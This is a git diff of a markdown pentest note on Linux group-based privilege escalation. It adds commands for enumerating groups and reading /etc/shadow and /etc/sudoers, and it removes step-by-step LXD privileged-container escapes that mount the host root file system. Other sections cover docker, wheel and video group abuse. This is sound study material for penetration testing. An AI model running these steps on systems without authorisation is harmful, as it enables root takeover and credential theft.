@@ -8,6 +8,37 @@ links: "[[Privesc]]"
 
 # Group Enumeration
 
+Enumerate groups on the target system
+
+___
+
+<!-- Enumerate {{{-->
+## Enumerate
+
+<!-- Current {{{-->
+### Current
+
+List current user's groups
+
+```sh
+id
+```
+
+<!-- Example {{{-->
+> [!example]-
+>
+> ```sh
+> id
+> ```
+>
+> ```sh
+> uid=1000(kali) gid=1000(kali) groups=1000(kali),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),100(users),101(netdev),103(scanner),107(bluetooth),120(lpadmin),129(wireshark),130(kaboxer),131(vboxsf)
+> ```sh
+>
+<!-- }}} -->
+
+<!-- }}} -->
+
 <!-- Discover {{{-->
 ### Discover
 
@@ -26,7 +57,7 @@ cut -d: -f1 /etc/group
 <!-- }}} -->
 
 <!-- Members {{{-->
-## Members
+### Members
 
 [getent](https://linux.die.net/man/1/getent) —
 List members of all groups
@@ -54,11 +85,10 @@ getent group <group>
 > ```
 <!-- }}} -->
 
-___
 <!-- }}} -->
 
 <!-- Files {{{-->
-## Files
+### Files
 
 [[Find]] files belonging to a group
 
@@ -73,6 +103,8 @@ find / -group <group_name> 2>/dev/null
 >
 <!-- }}} -->
 
+<!-- }}} -->
+
 ___
 <!-- }}} -->
 
@@ -84,6 +116,10 @@ ___
 
 Members of the `adm` group are able to read all logs
 stored in `/var/log`
+
+```sh
+ls -al /var/log
+```
 
 <!-- Example {{{-->
 > [!example]-
@@ -110,8 +146,8 @@ stored in `/var/log`
 <!-- Auth {{{-->
 ### Auth
 
-In OpenBSD, members of the `auth` group allowed to write
-`/etc/skey` and `/var/db/yubikey`
+In OpenBSD, members of the `auth` group allowed
+to write `/etc/skey` and `/var/db/yubikey`
 
 <!-- Exploit {{{-->
 > [!tip]- Exploit
@@ -212,22 +248,20 @@ docker run -v /root:/mnt -it ubuntu
 
 <!-- }}} -->
 
-<!-- LXC / LXD {{{-->
-### LXC / LXD
+<!-- LXC {{{-->
+### LXC
 
-[LXD](https://canonical.com/lxd) is Ubuntu's container manager
-(*similar to Docker*)
-
-Membership of this group can be used
-to escalate privileges
+Members of the
+[[Containers/General#LXC|LXC]]
+group may access the host file system
+from a privileged container
 
 1. Create an LXD container
 2. Make it privileged
-3. Accessing the host file system at `/mnt/root`
+3. Access the host file system at `/mnt/root`
 
 <!-- Example {{{-->
 > [!example]-
->
 >
 > ```sh
 > devops@NIX02:~$ id
@@ -237,157 +271,29 @@ to escalate privileges
 > ```
 <!-- }}} -->
 
-<!-- Method 1 {{{-->
-#### Method 1
+<!-- }}} -->
 
-1. Download the latest [Alpine image](https://images.lxd.canonical.com/)
-(*`lxd.tar.xz` and `rootfs.squashfs`*)
-to use with lxd
+<!-- LXD {{{-->
+### LXD
 
-2. Initialize LXD and set up with defaults
+Members of the
+[[Containers/General#LXD|LXD]]
+group may access the host file system
+from a privileged container
 
-```sh
-lxd init
-```
+1. Create an LXD container
+2. Make it privileged
+3. Access the host file system at `/mnt/root`
 
 <!-- Example {{{-->
 > [!example]-
 >
 > ```sh
-> devops@NIX02:~$ lxd init
+> devops@NIX02:~$ id
 > ```
->
 > ```sh
-> Do you want to configure a new storage pool (yes/no) [default=yes]? yes
-> Name of the storage backend to use (dir or zfs) [default=dir]: dir
-> Would you like LXD to be available over the network (yes/no) [default=no]? no
-> Do you want to configure the LXD bridge (yes/no) [default=yes]? yes
+> uid=1009(devops) gid=1009(devops) groups=1009(devops),110(lxd)
 > ```
->
-> ```sh
-> /usr/sbin/dpkg-reconfigure must be run as root
-> error: Failed to configure the bridge
-> ```
-<!-- }}} -->
-
-3. Upload the files (*`lxd.tar.xz`, `rootfs.squashfs`*)
-
-```sh
-lxc image import lxd.tar.xz rootfs.squashfs --alias alpine
-```
-
-4. Check the image is there
-
-```sh
-lxc image list
-```
-
-5. Create privileged container
-
-```sh
-lxc init alpine r00t -c security.privileged=true
-```
-
-<!-- Info {{{-->
-> [!info]-
->
-> - `security.privileged=true`: Run the container without a UID mapping
-<!-- }}} -->
-
-6. List containers
-
-```sh
-lxc list
-```
-
-7. Mount the host filesystem
-
-```sh
-lxc config device add r00t host-root disk source=/ path=/mnt/root recursive=true
-```
-
-<!-- No Storage Pool {{{-->
-> [!warning]- No Storage Pool
->
-> ```sh
-> Error: No storage pool found. Please create a new storage pool
-> ```
-> 1. Initialize lxd and set up all options on default
->
-> ```sh
-> lxd init
-> ```
->
-> 2. Repeat the previous commands
->
-<!-- }}} -->
-
-8. Execute the container
-
-```sh
-lxc start r00t
-```
-
-```sh
-lxc exec r00t /bin/sh
-```
-
-9. [cd](https://man7.org/linux/man-pages/man1/cd.1p.html)
-   into the mounted filesystem
-
-```sh
-cd /mnt/root
-```
-
-<!-- }}} -->
-
-<!-- Method 2 {{{-->
-#### Method 2
-
-1. Build a simple Alpine image
-
-```sh
-git clone https://github.com/saghul/lxd-alpine-builder
-```
-```sh
-cd lxd-alpine-builder
-```
-```sh
-sed -i 's,yaml_path="latest-stable/releases/$apk_arch/latest-releases.yaml",yaml_path="v3.8/releases/$apk_arch/latest-releases.yaml",' build-alpine
-```
-```sh
-sudo ./build-alpine -a i686
-```
-
-2. Import the image
-
-```sh
-cd $HOME
-```
-
-```sh
-lxc image import ./alpine*.tar.gz --alias myimage
-```
-
-3. Start and configure the lxd storage pool as default
-(*Before running the image*)
-
-```sh
-lxd init
-```
-
-4. Run the image
-
-```sh
-lxc init myimage mycontainer -c security.privileged=true
-```
-
-5. Mount the `/root` into the image
-
-```sh
-lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
-```
-
 <!-- }}} -->
 
 <!-- }}} -->
@@ -395,8 +301,8 @@ lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursiv
 <!-- Root {{{-->
 ### Root
 
-Allow members to access or modify some service configuration files
-or libraries
+Members of the `root` group can access or modify
+some service configuration files or libraries
 
 Discover files `root` members can modify
 
@@ -409,10 +315,14 @@ find / -group root -perm -g=w 2>/dev/null
 <!-- Shadow {{{-->
 ### Shadow
 
-Allow members to read `/etc/shadow`
+Members of the `shadow` group can read `/etc/shadow`
 
 ```sh
 -rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
+```
+
+```sh
+cat /etc/shadow
 ```
 
 <!-- }}} -->
@@ -420,8 +330,8 @@ Allow members to read `/etc/shadow`
 <!-- Staff {{{-->
 ### Staff
 
-Allow members to add local modifications to the system (`/usr/local`)
-without needing `root` privileges
+Members of the `staff` group can add local modifications
+to the system (`/usr/local`) without `root` privileges
 
 <!-- Tip {{{-->
 > [!tip]
@@ -528,14 +438,13 @@ $ ls -la /bin/bash
 <!-- Video {{{-->
 ### Video
 
-Allow members access to the screen output.
+Members of the `video` group can access the screen output
 
 Grab the current image on the screen in raw data
-and get the resolution that the screen is using.
-The screen data can be saved in /dev/fb0
-and you could find
+and get the resolution that the screen is using
+(*saved to `/dev/fb0`*)
 
-1. Get user login with [[User#Login|w]]
+1. [[User#Login|w]] - Get user login
 
 ```sh
 w
@@ -573,13 +482,18 @@ cat /sys/class/graphics/fb0/virtual_size
 <!-- Wheel {{{-->
 ### Wheel
 
-If `/etc/sudoers` contains this line
+Members of the `wheel` group can execute anything as `sudo`
+if enabled in `/etc/sudoers`
+
+```sh
+cat /etc/sudoers
+```
 
 ```sh
 %wheel  ALL=(ALL:ALL) ALL
 ```
 
-Then `wheel` allows users to execute anything as `sudo`
+Execute anything as `sudo`
 
 ```sh
 sudo su
@@ -587,4 +501,5 @@ sudo su
 
 <!-- }}} -->
 
+___
 <!-- }}} -->
